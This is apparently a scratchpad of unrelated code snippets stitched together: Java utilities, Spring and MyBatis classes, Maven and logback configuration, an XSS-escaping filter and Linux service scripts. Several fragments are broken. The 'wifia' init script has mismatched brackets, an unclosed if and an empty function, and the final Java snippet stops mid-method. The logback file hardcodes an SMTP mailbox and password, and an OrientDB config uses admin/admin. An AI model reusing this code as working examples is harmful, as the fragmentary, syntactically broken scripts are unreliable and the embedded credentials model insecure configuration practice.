7. Группировка списка рабочих по их должности и по возрасту.

Подсказал пользователь j2ck

Map<String, Map<Integer, List<Worker>>> collect = workers.stream()
       .collect(Collectors.groupingBy(Worker::getPosition, 
              Collectors.groupingBy(Worker::getAge)));
--------------------------------------------------------------------------------------------------------
 
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;
import java.util.stream.Stream;

public class ListFiles {
    public static void main(String[] args) {
      File folder = new File("G:\\Test");
      ListFiles listFiles = new ListFiles();
      System.out.println("reading files before Java8 - Using listFiles() method");
      listFiles.listAllFiles(folder);
      System.out.println("-------------------------------------------------");
      System.out.println("reading files Java8 - Using Files.walk() method");
      listFiles.listAllFiles("G:\\Test");

     }
     // Uses listFiles method  
     public void listAllFiles(File folder){
         System.out.println("In listAllfiles(File) method");
         File[] fileNames = folder.listFiles();
         for(File file : fileNames){
             // if directory call the same method again
             if(file.isDirectory()){
                 listAllFiles(file);
             }else{
                 try {
                     readContent(file);
                 } catch (IOException e) {
                     // TODO Auto-generated catch block
                     e.printStackTrace();
                 }
        
             }
         }
     }
     // Uses Files.walk method   
     public void listAllFiles(String path){
         System.out.println("In listAllfiles(String path) method");
         try(Stream<Path> paths = Files.walk(Paths.get(path))) {
             paths.forEach(filePath -> {
                 if (Files.isRegularFile(filePath)) {
                     try {
                         readContent(filePath);
                     } catch (Exception e) {
                         // TODO Auto-generated catch block
                         e.printStackTrace();
                     }
                 }
             });
         } catch (IOException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
         } 
     }
     
     public void readContent(File file) throws IOException{
         System.out.println("read file " + file.getCanonicalPath() );
         try(BufferedReader br  = new BufferedReader(new FileReader(file))){
               String strLine;
               // Read lines from the file, returns null when end of stream 
               // is reached
               while((strLine = br.readLine()) != null){
                System.out.println("Line is - " + strLine);
               }
         }
     }
     
     public void readContent(Path filePath) throws IOException{
         System.out.println("read file " + filePath);
         List<String> fileList = Files.readAllLines(filePath);
         System.out.println("" + fileList);
     }    
}
--------------------------------------------------------------------------------------------------------
<dependency>
				<groupId>org.apache.isis.core</groupId>
				<artifactId>isis</artifactId>
				<version>${isis.version}</version>
				<type>pom</type>
				<scope>import</scope>
			</dependency>

			<dependency>
				<groupId>org.apache.isis.viewer</groupId>
				<artifactId>isis-viewer-wicket</artifactId>
				<version>${isis.version}</version>
				<type>pom</type>
				<scope>import</scope>
			</dependency>
--------------------------------------------------------------------------------------------------------
Using from the command-line

Build the urm-core project with mvn clean package and grab the generated artifact urm-core.jar. Then you need the archive that will be analyzed. In this example we use abstract-factory.jar and assume the package name to be com.iluwatar.abstractfactory. Place the jar-files in the same directory and execute the following command.

java -cp abstract-factory.jar:urm-core.jar DomainMapperCli -p com.iluwatar.abstractfactory -i com.iluwatar.abstractfactory.Castle

This will scan all classes under the package com.iluwatar.abstractfactory except Castle that was marked to be ignored and output the .dot file to your console output. If you want to write it to file use switch -f filename.dot. If you need to scan multiple packages use format -p "com.package1, com.package2". Note that under Windows OS the classpath separator is ; instead of :
--------------------------------------------------------------------------------------------------------
import de.markusmo3.urm.presenters.Presenter;
import de.markusmo3.urm.presenters.Representation;
import org.apache.maven.artifact.DependencyResolutionRequiredException;
import org.apache.maven.plugin.AbstractMojo;
import org.apache.maven.plugin.MojoExecutionException;
import org.apache.maven.plugin.MojoFailureException;
import org.apache.maven.plugins.annotations.*;
import org.apache.maven.project.MavenProject;
import org.reflections.Reflections;

import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

@Mojo(name = "map", defaultPhase = LifecyclePhase.PROCESS_CLASSES, requiresDependencyResolution = ResolutionScope.COMPILE)
public class DomainMapperMojo extends AbstractMojo {

    @Parameter(defaultValue = "${project.basedir}", property = "outputDir", required = true)
    private File outputDirectory;
    @Component
    private MavenProject project;
    @Parameter(property = "map.packages", required = true)
    private List<String> packages;
    @Parameter(property = "map.ignores", required = false)
    private List<String> ignores;
    @Parameter(property = "presenter", required = false)
    private String presenterString;
    @Parameter(property = "map.skipForProjects", required = false)
    private List<String> skipForProjects;

    @Override
    public void execute() throws MojoExecutionException, MojoFailureException {
        if (skipForProjects != null && !skipForProjects.isEmpty()) {
            String projectName = project.getName();
            if (skipForProjects.contains(projectName)) {
                getLog().info("Skip configured (in pom.xml) for current project \"" + projectName +"\". " +
                        "Plugin will not be executed!");
                return;
            }
        }

        if (packages.isEmpty())
            throw new MojoFailureException("No packages defined for scanning.");
        try {
            Presenter presenter = Presenter.parse(presenterString);

            String fileName = project.getName() + ".urm." + presenter.getFileEnding();
            Path path = Paths.get(outputDirectory.getPath(), fileName);

            if (!getLog().isDebugEnabled()) {
                // nullify the Reflections logger to prevent it from spamming
                // the console if we aren't in debug mode
                Reflections.log = null;
            }

            if (!Files.exists(path)) {
                List<URL> projectClasspathList = getClasspathUrls();
                DomainMapper mapper = DomainMapper.create(presenter, packages, ignores,
                        new URLClassLoader(projectClasspathList.toArray(new URL[projectClasspathList.size()])));

                Representation representation = mapper.describeDomain();
                Files.write(path, representation.getContent().getBytes());
                getLog().info(fileName + " successfully written to: \"" + path + "\"!");
            } else {
                getLog().info(fileName + " already exists, file was not overwritten!");
            }
        } catch (ClassNotFoundException | DependencyResolutionRequiredException | IOException e) {
            throw new MojoExecutionException(e.getMessage(), e);
        }
    }

    @SuppressWarnings("unchecked")
    private List<URL> getClasspathUrls() throws DependencyResolutionRequiredException, MojoExecutionException {
        List<URL> projectClasspathList = new ArrayList<>();
        for (String element : (List<String>) project.getCompileClasspathElements()) {
            try {
                projectClasspathList.add(new File(element).toURI().toURL());
            } catch (MalformedURLException e) {
                throw new MojoExecutionException(element + " is an invalid classpath element", e);
            }
        }
        return projectClasspathList;
    }
}
--------------------------------------------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8" standalone="no"?><factorypath>
    <factorypathentry enabled="true" id="M2_REPO/org/membrane-soa/service-proxy-annot/4.6.3-SNAPSHOT/service-proxy-annot-4.6.3-SNAPSHOT.jar" kind="VARJAR" runInBatchMode="false"/>
</factorypath>
--------------------------------------------------------------------------------------------------------
	public static class StreamPumpStats {
		private static ArrayList<StreamPump> pumps = new ArrayList<StreamPump>();

		public synchronized int getRunning() {
			return pumps.size();
		}
		public synchronized void registerPump(StreamPump pump) {
			pumps.add(pump);
		}
		public synchronized void unregisterPump(StreamPump pump) {
			pumps.remove(pump);
		}
		public synchronized List<StreamPump> getStreamPumps() {
			return new ArrayList<StreamPump>(pumps);
		}
		public synchronized void closeAllStreamPumps() {
			for (StreamPump p : pumps) {
				p.close();
			}
		}
	}
--------------------------------------------------------------------------------------------------------
import com.hantsylabs.restexample.springmvc.domain.User;
import com.hantsylabs.restexample.springmvc.security.SecurityUtil;
import org.springframework.boot.autoconfigure.domain.EntityScan;
import org.springframework.context.annotation.AdviceMode;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.domain.AuditorAware;
import org.springframework.data.jpa.convert.threeten.Jsr310JpaConverters;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;
import org.springframework.transaction.annotation.EnableTransactionManagement;

/**
 *
 * @author hantsy
 */
@Configuration
@EnableTransactionManagement(mode = AdviceMode.ASPECTJ)
@EntityScan(basePackageClasses = {User.class, Jsr310JpaConverters.class})
@EnableJpaAuditing(auditorAwareRef = "auditor")
public class JpaConfig {

    @Bean
    public AuditorAware<User> auditor() {
        return () -> SecurityUtil.currentUser();
    }

}
--------------------------------------------------------------------------------------------------------
#!/bin/bash
#
# wifia     Startup script for the wifia server 
#
# chkconfig: - 85 15
# description: wifia web server
#
# processname: wifia

# Source function library.
. /etc/rc.d/init.d/functions

start_service="/root/documents/start_ap.sh"
stop_service="/root/documents/stop_ap.sh"
conf="/etc/wifia/wifia.conf"
#lighttpd="/usr/sbin/wifia"
pidfile="/var/run/wifia.pid"
user="root"
prog=wifia

start() {
	echo -n "Starting $prog service ..."
	sudo $start_service
	$? -eq 0 ] && echo " [ OK ] " || echo " [ FAILED ] "
}

stop() {
	echo -n $"Stopping $prog service ..."
	[ -f "$pidfile" ] && read line < "$pidfile"
	sudo $stop_service
	if [ -d "/proc/$line" -a -f $conf ]
    then
  	    pkill -KILL -u $user $prog [ $? -eq 0 ] && echo " [ OK ] " || echo " [ FAILED ] " [ -f "$pidfile" ] && rm -f "$pidfile"
}

reload() {
}

case "$1" in
	start)
		start
		;;
	stop)
		stop
		;;
	restart)
		stop
		start
		;;
	reload)
		reload
		;;
	status)
		status
		;;
	*)
		echo $"Usage: $0 {start|stop|restart|reload|status}" 
--------------------------------------------------------------------------------------------------------
import io.pivotal.web.service.UserService;

import java.io.IOException;
import java.util.Enumeration;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.Authentication;
import org.springframework.security.web.authentication.logout.SimpleUrlLogoutSuccessHandler;
import org.springframework.stereotype.Component;

@Component
public class LogoutSuccessHandler extends SimpleUrlLogoutSuccessHandler {
	private static final Logger logger = LoggerFactory
			.getLogger(LogoutSuccessHandler.class);
	@Autowired
	private UserService service;

	public LogoutSuccessHandler() {
		super();
	}
	// Just for setting the default target URL
	public LogoutSuccessHandler(String defaultTargetURL) {
		this.setDefaultTargetUrl(defaultTargetURL);
	}

	@Override
	public void onLogoutSuccess(HttpServletRequest request,
			HttpServletResponse response, Authentication authentication)
			throws IOException, ServletException {

		service.logout(authentication.getPrincipal().toString());
		super.onLogoutSuccess(request, response, authentication);
	}
}
--------------------------------------------------------------------------------------------------------
import java.security.MessageDigest;

/**
 * User: rizenguo
 * Date: 2014/10/23
 * Time: 15:43
 */
public class MD5 {
    private final static String[] hexDigits = {"0", "1", "2", "3", "4", "5", "6", "7",
            "8", "9", "a", "b", "c", "d", "e", "f"};

    /**
     * 转换字节数组为16进制字串
     * @param b 字节数组
     * @return 16进制字串
     */
    public static String byteArrayToHexString(byte[] b) {
        StringBuilder resultSb = new StringBuilder();
        for (byte aB : b) {
            resultSb.append(byteToHexString(aB));
        }
        return resultSb.toString();
    }

    /**
     * 转换byte到16进制
     * @param b 要转换的byte
     * @return 16进制格式
     */
    private static String byteToHexString(byte b) {
        int n = b;
        if (n < 0) {
            n = 256 + n;
        }
        int d1 = n / 16;
        int d2 = n % 16;
        return hexDigits[d1] + hexDigits[d2];
    }

    /**
     * MD5编码
     * @param origin 原始字符串
     * @return 经过MD5加密之后的结果
     */
    public static String MD5Encode(String origin) {
        String resultString = null;
        try {
            resultString = origin;
            MessageDigest md = MessageDigest.getInstance("MD5");
            resultString = byteArrayToHexString(md.digest(resultString.getBytes()));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return resultString;
    }

}

import java.security.MessageDigest;

/**
 * <p>
 * Title: SHA1算法
 * </p>
 */
public final class SHA1 {

    private static final char[] HEX_DIGITS = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};

    /**
     * Takes the raw bytes from the digest and formats them correct.
     *
     * @param bytes the raw bytes from the digest.
     * @return the formatted bytes.
     */
    private static String getFormattedText(byte[] bytes) {
        int len = bytes.length;
        StringBuilder buf = new StringBuilder(len * 2);
        // 把密文转换成十六进制的字符串形式
        for (int j = 0; j < len; j++) {
            buf.append(HEX_DIGITS[(bytes[j] >> 4) & 0x0f]);
            buf.append(HEX_DIGITS[bytes[j] & 0x0f]);
        }
        return buf.toString();
    }

    public static String encode(String str) {
        if (str == null) {
            return null;
        }
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("SHA1");
            messageDigest.update(str.getBytes());
            return getFormattedText(messageDigest.digest());
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
--------------------------------------------------------------------------------------------------------
select 1 from information_schema.system_users;
--------------------------------------------------------------------------------------------------------
import com.ldlood.dataobject.ProductCategory;
import org.apache.ibatis.annotations.*;

import java.util.List;
import java.util.Map;

/**
 * Created by Ldlood on 2017/8/15.
 */
public interface ProductCategoryMapper {


    @Insert("insert into product_category(category_name, category_type) values (#{categoryName, jdbcType=VARCHAR}, #{category_type, jdbcType=INTEGER})")
    int insertByMap(Map<String, Object> map);


    @Insert("insert into product_category(category_name, category_type) values (#{categoryName, jdbcType=VARCHAR}, #{categoryType, jdbcType=INTEGER})")
    int insertByObject(ProductCategory productCategory);

    @Select("select * from product_category where category_type=#{categoryType} ")
    @Results({
            @Result(column = "category_id", property = "categoryId"),
            @Result(column = "category_name", property = "categoryName"),
            @Result(column = "category_type", property = "categoryType")
    })
    ProductCategory findByCategoryType(Integer categoryType);


    @Select("select * from product_category where category_name = #{categoryName}")
    @Results({
            @Result(column = "category_id", property = "categoryId"),
            @Result(column = "category_name", property = "categoryName"),
            @Result(column = "category_type", property = "categoryType")
    })
    List<ProductCategory> findByCategoryName(String categoryName);

    @Update("update product_category set category_name=#{categoryName} where category_type=#{categoryType}")
    int updateByCategoryType(@Param("categoryName") String categoryName,
                             @Param("categoryType") Integer categoryType);

    @Update("update product_category set category_name = #{categoryName} where category_type = #{categoryType}")
    int updateByObject(ProductCategory productCategory);

    @Delete("delete from product_category where category_type = #{categoryType}")
    int deleteByCategoryType(Integer categoryType);



    //    xml方式
    ProductCategory selectByCategoryType(Integer categoryType);
}
--------------------------------------------------------------------------------------------------------
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

import javax.websocket.OnClose;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;
import java.util.concurrent.CopyOnWriteArraySet;

/**
 * Created by Ldlood on 2017/8/14.
 */
@Component
@ServerEndpoint("/webSocket")
@Slf4j
public class WebSocket {

    private Session session;

    private static CopyOnWriteArraySet<WebSocket> webSockets = new CopyOnWriteArraySet<>();

    @OnOpen
    public void onOpen(Session session) {
        this.session = session;
        webSockets.add(this);
        log.info("【websocket消息】有新的连接, 总数:{}", webSockets.size());
    }


    @OnClose
    public void onClose() {
        webSockets.remove(this);
        log.info("【websocket消息】连接断开, 总数:{}", webSockets.size());
    }

    @OnMessage
    public void onMessage(String message) {
        log.info("【websocket消息】收到客户端发来的消息:{}", message);
    }

    public void sendMessage(String message){
        for (WebSocket webSocket: webSockets) {
            log.info("【websocket消息】广播消息, message={}", message);
            try {
                webSocket.session.getBasicRemote().sendText(message);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;

import java.awt.*;
import java.beans.PropertyChangeListener;
import java.beans.PropertyEditor;

/**
 * Used to bind Strings to a {@link org.springframework.security.core.GrantedAuthority} when adding/editing a client.
 * <p>
 * Only implements {@link #getAsText()} and {@link #setAsText(String)}.
 *
 * @author Moritz Schulze
 */
public class AuthorityPropertyEditor implements PropertyEditor {
    private GrantedAuthority grantedAuthority;

    @Override
    public void setValue(Object value) {
        this.grantedAuthority = (GrantedAuthority) value;
    }

    @Override
    public Object getValue() {
        return grantedAuthority;
    }

    @Override
    public boolean isPaintable() {
        return false;
    }

    @Override
    public void paintValue(Graphics gfx, Rectangle box) {

    }

    @Override
    public String getJavaInitializationString() {
        return null;
    }

    @Override
    public String getAsText() {
        return grantedAuthority.getAuthority();
    }

    @Override
    public void setAsText(String text) throws IllegalArgumentException {
        if (text != null && !text.isEmpty()) {
            this.grantedAuthority = new SimpleGrantedAuthority(text);
        }
    }

    @Override
    public String[] getTags() {
        return new String[0];
    }

    @Override
    public Component getCustomEditor() {
        return null;
    }

    @Override
    public boolean supportsCustomEditor() {
        return false;
    }

    @Override
    public void addPropertyChangeListener(PropertyChangeListener listener) {

    }

    @Override
    public void removePropertyChangeListener(PropertyChangeListener listener) {

    }
}
--------------------------------------------------------------------------------------------------------
spring.data.orient:
  url: memory:orientdb/test1test
  username: admin
  password: admin
--------------------------------------------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<configuration scan="true" scanPeriod="30 seconds">

	<contextListener class="ch.qos.logback.classic.jul.LevelChangePropagator">
		<resetJUL>true</resetJUL>
	</contextListener>

	<property name="appname" value="xfqcodetemplate" />

	<!--定义日志文件的存储地址 勿在 LogBack 的配置中使用相对路径 -->
	<property name="LOG_HOME" value="/xfqcodetemplate" />

	<!-- 按照每天生成日志文件 -->
	<appender name="file"
		class="ch.qos.logback.core.rolling.RollingFileAppender">
		<rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
			<!--日志文件输出的文件名 -->
			<FileNamePattern>${LOG_HOME}/${appname}.log.%d{yyyy-MM-dd}.log
			</FileNamePattern>
			<MaxHistory>30</MaxHistory>
		</rollingPolicy>
		<layout class="ch.qos.logback.classic.PatternLayout">
			<!--格式化输出：%d表示日期，%thread表示线程名，%-5level：级别从左显示5个字符宽度%msg：日志消息，%n是换行符 -->
			<pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} [%X{user}] [%thread] %-5level %logger{50} -%msg%n
			</pattern>
		</layout>
		<!--日志文件最大的大小 -->
		<triggeringPolicy
			class="ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy">
			<MaxFileSize>10MB</MaxFileSize>
		</triggeringPolicy>
	</appender>

	<!-- To enable JMX Management -->
	<jmxConfigurator />

	<appender name="console" class="ch.qos.logback.core.ConsoleAppender">
		<encoder>
			<pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} [%X{user}] [%thread] %-5level %logger{36} -%msg%n</pattern>
		</encoder>
	</appender>

	<logger name="org.hibernate" level="error" />
	<logger name="cn.xiaowenjie" level="debug">
		<!-- wenjie delete <appender-ref ref="file" /> <appender-ref ref="console" 
			/> -->
	</logger>

	<!-- 定义错误邮件发送 -->
	<property name="smtpHost" value="smtp.qq.com" />
	<property name="smtpPort" value="25" />
	<property name="username" value="121509092@qq.com" />
	<property name="password" value="notnull" />
	<property name="SSL" value="false" />
	<property name="email_to" value="121509092@qq.com" />
	<property name="email_from" value="121509092@qq.com" />
	<property name="email_subject" value="${USERNAME}【Error】: %logger" />

	<appender name="EMAIL" class="ch.qos.logback.classic.net.SMTPAppender">
		<smtpHost>${smtpHost}</smtpHost>
		<smtpPort>${smtpPort}</smtpPort>
		<username>${username}</username>
		<password>${password}</password>
		<SSL>${SSL}</SSL>
		<asynchronousSending>true</asynchronousSending>
		<to>${email_to}</to>
		<from>${email_from}</from>
		<subject>${email_subject}</subject>
		<layout class="ch.qos.logback.classic.html.HTMLLayout">
			<pattern>%date%level%thread%logger{0}%line%message</pattern>
		</layout>
	</appender>

	<root level="info">
		<!-- 
		<appender-ref ref="file" />
		 -->
		<appender-ref ref="console" />
		<appender-ref ref="EMAIL" />
	</root>
</configuration>
--------------------------------------------------------------------------------------------------------
import org.hibernate.Criteria;
import org.hibernate.FlushMode;
import org.hibernate.SessionFactory;
import org.hibernate.criterion.Order;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.transaction.annotation.Transactional;

import java.io.Serializable;
import java.util.Collection;

/**
 * Generic CRUD Repository class functionality with Hibernate Session Factory
 *
 * Created by Y.Kamesh on 8/2/2015.
 */
public abstract class BaseHibernateJPARepository<T extends Entity, ID extends Serializable> implements BaseJPARepository<T, ID> {
    protected @Autowired
    SessionFactory sessionFactory;
    protected Class<T> clazz;


    @SuppressWarnings("unchecked")
    public void setupEntityClass(Class clazz) {
        this.clazz = clazz;
    }


    public void delete(T object) {
        sessionFactory.getCurrentSession().delete(object);
    }


    @Transactional
    public T insert(T object) {
        sessionFactory.getCurrentSession().setFlushMode(FlushMode.AUTO);
        sessionFactory.getCurrentSession().save(object);
        sessionFactory.getCurrentSession().flush();
        return object;
    }


    @Transactional
    public T update(T object) {
        sessionFactory.getCurrentSession().setFlushMode(FlushMode.AUTO);
        sessionFactory.getCurrentSession().update(object);
        sessionFactory.getCurrentSession().flush();
        return object;
    }


    @Transactional
    public T insertOrUpdate(T object) {
        sessionFactory.getCurrentSession().setFlushMode(FlushMode.AUTO);
        sessionFactory.getCurrentSession().saveOrUpdate(object);
        sessionFactory.getCurrentSession().flush();
        return object;
    }


    @Transactional(readOnly = true)
    public T findById(ID id) {
        return (T) sessionFactory.getCurrentSession().get(clazz, id);
    }


    public Collection<T> findAllByPage(int pageNum, int countPerPage, Order order) {
        Criteria c = sessionFactory.getCurrentSession().createCriteria(clazz);
        c.setMaxResults(countPerPage);
        c.setFirstResult(pageNum * countPerPage);
        return c.list();
    }
}

import org.hibernate.criterion.Order;

import java.io.Serializable;
import java.util.Collection;

/**
 * Generic JPA Repository protocol with common CRUD operations and some specific find operations
 *
 * Created by Y.Kamesh on 8/2/2015.
 */
public interface BaseJPARepository<T extends Entity, ID extends Serializable> {
    /**
     * Method to setup the class type of the Entity for which
     * the DAO works
     *
     * @param clazz
     */
    public void setupEntityClass(Class clazz);

    /**
     * Method to insert the new row into config.database table
     *
     * @param object
     *         The object entity to be persisted
     */
    public T insert(T object);

    /**
     * Method to update an existing row in the config.database table
     *
     * @param object
     *         The object entity to be updated
     */
    public T update(T object);

    /**
     * Method to insert a new row or update a row if it was
     * already existing in the system.
     *
     * @param object
     *         The object entity to be updated
     */
    public T insertOrUpdate(T object);

    /**
     * Method to delete an existing row in the config.database table
     *
     * @param object
     *         The object entity to be deleted
     */
    public void delete(T object);

    /**
     * Method to find a database item by id
     *
     * @param id
     *         The id by which the row has to be found
     */
    public T findById(ID id);

    /**
     * Method to find a collection of database entities by pages
     *
     * @param pageNum
     * @param countPerPage
     * @param order
     *
     * @return
     *
     * @throws Exception
     */
    public Collection<T> findAllByPage(int pageNum, int countPerPage, Order order);
}
--------------------------------------------------------------------------------------------------------
MediaType.parseMediaType("application/json;charset=UTF-8")
--------------------------------------------------------------------------------------------------------
    @XmlAccessorType(XmlAccessType.NONE)
    public static class Text extends WxMessageBody {

        @JsonProperty("content")
        protected String content;

        public Text(String content) {
            this.content = content;
        }

        public Text() {
        }

        public String getContent() {
            return content;
        }
    }
--------------------------------------------------------------------------------------------------------
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;

import org.springframework.web.util.HtmlUtils;

/**
 * 防止XSS攻击的过滤器
 * 
 * @author wujing
 */
@WebFilter(filterName = "webXssFilter", urlPatterns = "/admin/*")
public class WebXssFilter implements Filter {

	@Override
	public void init(FilterConfig filterConfig) throws ServletException {

	}

	@Override
	public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
		XssHttpServletRequestWrapper xssRequest = new XssHttpServletRequestWrapper((HttpServletRequest) request);
		chain.doFilter(xssRequest, response);
	}

	@Override
	public void destroy() {

	}
}

/**
 * 
 * @author wujing
 */
class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {

	/**
	 * @param request
	 */
	public XssHttpServletRequestWrapper(HttpServletRequest request) {
		super(request);
	}

	@Override
	public String[] getParameterValues(String name) {
		String[] values = super.getParameterValues(name);
		if (values != null) {
			int length = values.length;
			String[] escapseValues = new String[length];
			for (int i = 0; i < length; i++) {
				// 防xss攻击和过滤前后空格
				escapseValues[i] = HtmlUtils.htmlEscape(values[i]).trim();
			}
			return escapseValues;
		}
		return super.getParameterValues(name);
	}
}
--------------------------------------------------------------------------------------------------------
#!/bin/sh

## 自定义
SERVICE_DIR=/home/roncoo/rc-os/roncoo-jui-springboot/
SERVICE_NAME=roncoo-jui-springboot
SPRING_PROFILES_ACTIVE=prod

## java env
export JAVA_HOME=/opt/jdk1.8
export JRE_HOME=$JAVA_HOME/jre

case "$1" in 
	start)
		procedure=`ps -ef | grep -w "${SERVICE_DIR}/${SERVICE_NAME}" |grep -w "java"| grep -v "grep" | awk '{print $2}'`
		if [ "${procedure}" = "" ];
		then
			echo "start ..."
			if [ "$2" != "" ];
			then
				SPRING_PROFILES_ACTIVE=$2
			fi
			echo "spring.profiles.active=${SPRING_PROFILES_ACTIVE}"
			exec nohup ${JRE_HOME}/bin/java -Xms256m -Xmx256m -jar ${SERVICE_DIR}/${SERVICE_NAME}\.jar --spring.profiles.active=${SPRING_PROFILES_ACTIVE} >/dev/null 2>&1 &
			echo "start success"
		else
			echo "${SERVICE_NAME} is start"
		fi
		;;
		
	stop)
		procedure=`ps -ef | grep -w "${SERVICE_DIR}/${SERVICE_NAME}" |grep -w "java"| grep -v "grep" | awk '{print $2}'`
		if [ "${procedure}" = "" ];
		then
			echo "${SERVICE_NAME} is stop"
		else
			kill ${procedure}
			sleep 1
			argprocedure=`ps -ef | grep -w "${SERVICE_DIR}/${SERVICE_NAME}" |grep -w "java"| grep -v "grep" | awk '{print $2}'`
			if [ "${argprocedure}" = "" ];
			then
				echo "${SERVICE_NAME} stop success"
			else
				kill -9 ${argprocedure}
				echo "${SERVICE_NAME} stop error"
			fi
		fi
		;;
		
	restart)
		$0 stop
		sleep 1
		$0 start $2
		;;  
		
	*)
		$0 stop
		sleep 1
		$0 start $2
		;; 
esac
--------------------------------------------------------------------------------------------------------
@ConditionalOnExpression("'${swagger.enable}' == 'true'")
--------------------------------------------------------------------------------------------------------
    @VisibleForTesting
    protected CustomizableEmailRendererBuilder createCustomizableEmailRendererBuilder() {
        return CustomizableEmailRenderer.builder();
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.mail.javamail.MimeMessageHelper;

import javax.mail.MessagingException;
import javax.mail.internet.MimeMessage;

public class MimeMessageHelperExt extends MimeMessageHelper {

    private static final String HEADER_RETURN_RECEIPT = "Return-Receipt-To";

    private static final String HEADER_DEPOSITION_NOTIFICATION_TO = "Disposition-Notification-To";

    public MimeMessageHelperExt(MimeMessage mimeMessage) {
        super(mimeMessage);
    }

    public MimeMessageHelperExt(MimeMessage mimeMessage, String encoding) {
        super(mimeMessage, encoding);
    }

    public MimeMessageHelperExt(MimeMessage mimeMessage, boolean multipart) throws MessagingException {
        super(mimeMessage, multipart);
    }

    public MimeMessageHelperExt(MimeMessage mimeMessage, boolean multipart, String encoding) throws MessagingException {
        super(mimeMessage, multipart, encoding);
    }

    public MimeMessageHelperExt(MimeMessage mimeMessage, int multipartMode) throws MessagingException {
        super(mimeMessage, multipartMode);
    }

    public MimeMessageHelperExt(MimeMessage mimeMessage, int multipartMode, String encoding) throws MessagingException {
        super(mimeMessage, multipartMode, encoding);
    }

    public void setHeaderReturnReceipt(String emailToNotification) throws MessagingException {
        getMimeMessage().setHeader(HEADER_RETURN_RECEIPT, emailToNotification);
    }

    public void setHeaderDepositionNotificationTo(String emailToNotification) throws MessagingException {
        getMimeMessage().setHeader(HEADER_DEPOSITION_NOTIFICATION_TO, emailToNotification);
    }

}
--------------------------------------------------------------------------------------------------------
package org.artofsolving.jodconverter.util;

public class PlatformUtils {

    private static final String OS_NAME = System.getProperty("os.name").toLowerCase();
    
    private PlatformUtils() {
        throw new AssertionError("utility class must not be instantiated");
    }

    public static boolean isLinux() {
        return OS_NAME.startsWith("linux");
    }

    public static boolean isMac() {
        return OS_NAME.startsWith("mac");
    }

    public static boolean isWindows() {
        return OS_NAME.startsWith("windows");
    }

}
--------------------------------------------------------------------------------------------------------

import org.hamcrest.Matchers;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
import org.springframework.test.context.web.WebAppConfiguration;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.web.context.WebApplicationContext;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultHandlers.print;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.view;

/**
 * @author Abdullah Al Mamun Oronno (www.oneous.com)
 */

@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(locations = {"file:src/main/webapp/WEB-INF/servlet-context.xml", "file:src/main/webapp/WEB-INF/applicationContext-jpa.xml"})
public class HomeControllerTest {

    @Autowired
    protected WebApplicationContext wac;

    private MockMvc mockMvc;

    @Before
    public void setup() {
        this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).build();
    }


    @Test
    public void getDefaultHomePage() throws Exception {
        this.mockMvc.perform(get("/"))
                .andExpect(status().isOk())
                .andDo(print())
                .andExpect(view().name(Matchers.containsString("home")));
    }

    @Test
    public void viewName() throws Exception {
        this.mockMvc.perform(get("/home"))
                .andExpect(view().name(Matchers.containsString("home")));
    }

}
--------------------------------------------------------------------------------------------------------
@Aspect("pertarget(io.prometheus.client.spring.web.MethodTimer.timeable())")
@Scope("prototype")
@ControllerAdvice
public class MethodTimer {
    private final ReadWriteLock summaryLock = new ReentrantReadWriteLock();
    private final HashMap<String, Summary> summaries = new HashMap();

    public MethodTimer() {
    }

    @Pointcut("@annotation(io.prometheus.client.spring.web.PrometheusTimeMethod)")
    public void annotatedMethod() {
    }

    @Pointcut("annotatedMethod()")
    public void timeable() {
    }

    private PrometheusTimeMethod getAnnotation(ProceedingJoinPoint pjp) throws NoSuchMethodException {
        assert pjp.getSignature() instanceof MethodSignature;

